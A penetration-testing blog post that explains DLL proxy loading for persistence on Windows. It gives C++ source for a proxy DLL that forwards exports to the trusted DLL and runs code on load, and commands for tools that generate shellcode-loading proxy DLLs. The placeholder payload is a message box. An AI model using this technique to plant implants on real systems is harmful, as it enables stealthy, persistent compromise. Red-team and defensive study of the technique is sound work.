# https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/

[Skip to content](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/#content)

DLL Proxy Loading is a technique which an arbitrary DLL exports the same functions as the legitimate DLL and forwards the calls to the legitimate DLL in an attempt to not disrupt the execution flow so the binary is executed as normal. The technique falls under the category of [DLL Hijacking](https://pentestlab.blog/2017/03/27/dll-hijacking/) and it is typically utilized as a stealthier method to load an arbitrary DLL without breaking the original operation of a process which might be an indicator of compromise for defenders.

When a process is initiated DLL’s are also loaded and make calls to exported functions as illustrated in the diagram below:

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-loading.jpg?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-loading.jpg) DLL Loading

The DLL Proxy Loading technique requires an arbitrary DLL that will be planted in the same directory and with the same name of the legitimate DLL and will proxy the same exports as the original DLL. However, the arbitrary DLL will also load the implant code and therefore code will executed under the context of a trusted process.

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxy-loading.jpg?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxy-loading.jpg) DLL Proxy Loading

The following DLL code exports the following functions:

1. exportedFunction1
2. exportedFunction2
3. exportedFunction3

```
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) VOID exportedFunction1(int a)
{
    MessageBoxA(NULL, "Pentestlab exportedFunction1", "Pentestlab exportedFunction1", 0);
}

extern "C" __declspec(dllexport) VOID exportedFunction2(int a)
{
    MessageBoxA(NULL, "Pentestlab exportedFunction2", "Pentestlab exportedFunction2", 0);
}

extern "C" __declspec(dllexport) VOID exportedFunction3(int a)
{
    MessageBoxA(NULL, "Pentestlab exportedFunction3", "Pentestlab exportedFunction3", 0);
}
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-trusted-dll.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-trusted-dll.png) Trusted DLL

Executing the DLL will verify that the code is running as normal.

```
rundll32 DLL-Proxying.dll,exportedFunction1
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox.png) DLL Proxy Loading – Message Box

From the offensive perspective prior to developing an arbitrary DLL, the exported functions of the legitimate DLL needs to be identified. This is feasible with the DLL export viewer.

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-viewer.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-viewer.png) DLL Export Viewer

Alternatively, Visual Studio contains a binary which can used to retrieve the exported functions.

```
dumpbin.exe /exports C:\temp\DLL-Proxying.dll
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-dumpbin.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-dumpbin.png) DLL Export – Dumpbin

On the proxy DLL a comment directive in the source code will match the exported functions of the legitimate DLL.

```
#include "pch.h"

#pragma comment(linker, "/export:exportedFunction1=trusted1.exportedFunction1")
#pragma comment(linker, "/export:exportedFunction2=trusted1.exportedFunction2")
#pragma comment(linker, "/export:exportedFunction3=trusted1.exportedFunction3")

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        MessageBoxA(NULL, "DLL Proxy Loading", "DLL Proxy Loading", 0);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-proxy.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-proxy.png) DLL Proxy

Similarly, using the _dumpbin_ binary will verify the exported functions.

```
dumpbin.exe /exports C:\Users\panag\source\repos\Pentestlab\DLL-Proxying\x64\Release\DLL-Proxying.dll
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-proxy-dll-dumpbin.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-proxy-dll-dumpbin.png) DLL Export Function – Dumpbin

Execution of the DLL will verify the exported functions are linked to the trusted DLL.

```
rundll32.exe DLL-Proxying.dll,pentestlab
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox-1.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox-1.png) DLL Proxy Loading – MessageBox

Accenture has developed a tool call _Spartacus_ which can be used to identify DLL Proxy opportunities.

```
Spartacus.exe --mode detect
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus.png?w=952)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus.png) Spartacus – DLL Proxy Detection

In conjunction with Process Monitor it is also feasible to identify DLL Hijacking opportunities and export the output to a CSV file.

```
Spartacus.exe --mode dll --procmon Procmon64.exe --pml test.plm --csv ./output.csv --exports . --verbose
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus-dll-hijacking.png?w=958)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus-dll-hijacking.png) Spartacus – DLL Hijacking

[Melvin Langvik](https://twitter.com/Flangvik) developed a tool called [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) which retrieves exported functions from a legitimate DLL and generates a proxy DLL template that can be used for DLL Side Loading.

```
SharpDLLProxy.exe --dll libnettle-8.dll --payload shellcode.bin
```

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy.png) SharpDLLProxy

The tool will automatically grab the exported functions and will generate the DLL code. It should be noted that the shellcode should be dropped on disk in the form of a binary file (.bin).

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy-dll-proxy.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy-dll-proxy.png) SharpProxyDLL – DLL Proxy Code

Once the associated process is executed the proxy DLL will load the arbitrary code and will forward to the legitimate DLL the exported functions in order to enable the application to run as normal. It should be noted that the legitimate DLL should be renamed and the proxy DLL should contain the same name as the legitimate DLL file.

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-fzsftp.png?w=960)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-fzsftp.png) fzsftp

A command and control session will established every time the associated process is executed on the system. From the perspective of persistence it is essential to choose a common Windows process.

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-c2.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-c2.png) DLL Proxy Loading – C2[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-implant.png?w=972)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-implant.png) DLL Proxy Loading – Implant

The proxy DLL will run in the memory space of the process.

[![](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-process-thread.png?w=476)](https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-process-thread.png) DLL Proxy Loading – Thread

## References

- [https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence](https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence)
- [https://github.com/tothi/dll-hijack-by-proxying](https://github.com/tothi/dll-hijack-by-proxying)
- [https://github.com/Flangvik/SharpDllProxy](https://github.com/Flangvik/SharpDllProxy)
- [https://www.cobaltstrike.com/blog/create-a-proxy-dll-with-artifact-kit](https://www.cobaltstrike.com/blog/create-a-proxy-dll-with-artifact-kit)
- [https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/](https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/)

### Rate this:

### Share this:

- [Share on X (Opens in new window)X](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=twitter)
- [Share on Facebook (Opens in new window)Facebook](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=facebook)
- [Share on LinkedIn (Opens in new window)LinkedIn](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=linkedin)
- [Share on Reddit (Opens in new window)Reddit](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=reddit)
- [Share on Mastodon (Opens in new window)Mastodon](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=mastodon)
- [Share on Tumblr (Opens in new window)Tumblr](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=tumblr)
- [Share on WhatsApp (Opens in new window)WhatsApp](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=jetpack-whatsapp)
- [Share on Telegram (Opens in new window)Telegram](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=telegram)
- [Share on Pinterest (Opens in new window)Pinterest](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=pinterest)
- [Share on Pocket (Opens in new window)Pocket](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=pocket)
- [Email a link to a friend (Opens in new window)Email](mailto:?subject=%5BShared%20Post%5D%20Persistence%20-%20DLL%20Proxy%20Loading&body=https%3A%2F%2Fpentestlab.blog%2F2024%2F04%2F03%2Fpersistence-dll-proxy-loading%2F&share=email)

LikeLoading...

### _Related_

### Leave a comment [Cancel reply](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/\#respond)

Δ

- [Comment](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/#respond)
- [Reblog](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/)
- [Subscribe](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/) [Subscribed](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/)








  - [![](https://pentestlab.blog/wp-content/uploads/2024/08/cropped-pentestlab.webp?w=50) Penetration Testing Lab](https://pentestlab.blog/)

Join 2,366 other subscribers

Sign me up

  - Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fpentestlab.blog%252F2024%252F04%252F03%252Fpersistence-dll-proxy-loading%252F)


- - [![](https://pentestlab.blog/wp-content/uploads/2024/08/cropped-pentestlab.webp?w=50) Penetration Testing Lab](https://pentestlab.blog/)
  - [Subscribe](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/) [Subscribed](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/)
  - [Sign up](https://wordpress.com/start/)
  - [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fpentestlab.blog%252F2024%252F04%252F03%252Fpersistence-dll-proxy-loading%252F)
  - [Copy shortlink](https://wp.me/p2cWvm-8GB)
  - [Report this content](https://wordpress.com/abuse/?report_url=https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/)
  - [View post in Reader](https://wordpress.com/reader/blogs/32637504/posts/33393)
  - [Manage subscriptions](https://subscribe.wordpress.com/)
  - [Collapse this bar](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/)

[Toggle photo metadata visibility](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/#)[Toggle photo comments visibility](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/#)

Loading Comments...

Write a Comment...

Email (Required)Name (Required)Website